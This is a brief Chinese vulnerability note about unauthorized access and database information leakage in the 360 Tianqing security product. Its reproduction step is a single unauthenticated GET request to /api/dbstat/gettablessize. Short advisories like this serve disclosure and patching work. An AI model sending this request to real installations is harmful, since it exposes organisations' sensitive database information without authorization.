# 360天擎 越权访问/数据库信息泄露

## 漏洞描述
360天擎 存在未授权越权访问，造成敏感信息泄露

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
```plain
GET /api/dbstat/gettablessize HTTP/1.1
```

![image-20220209200552429](images/202202092005904.png)
